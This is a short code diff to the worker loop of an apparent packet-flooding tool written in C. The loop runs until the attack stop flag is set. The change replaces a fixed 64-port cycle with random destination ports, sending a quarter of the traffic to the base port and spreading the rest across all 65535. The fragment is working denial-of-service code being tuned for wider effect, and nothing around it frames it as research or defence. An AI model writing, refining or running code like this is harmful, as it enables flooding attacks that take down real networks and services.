@@ -142,14 +142,17 @@ static void *mega_worker(void *arg) {
     flags |= MSG_ZEROCOPY;
 #endif
     unsigned int zc = 0;
-    int port_off = 0;
     time_t start = time(NULL);
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
-        port_off = (port_off + 1) % 64;
-        uint16_t dp = (uint16_t)(mt->port_base + port_off);
+        /* 25% targeted hits on base port, 75% spread across all 65535 ports */
+        uint16_t dp;
+        if ((rand() & 3) == 0)
+            dp = (uint16_t)mt->port_base;
+        else
+            dp = (uint16_t)((rand() % 65535) + 1);
         if (dp == 0) dp = 1;
         mt->target.sin_port = htons(dp);
 
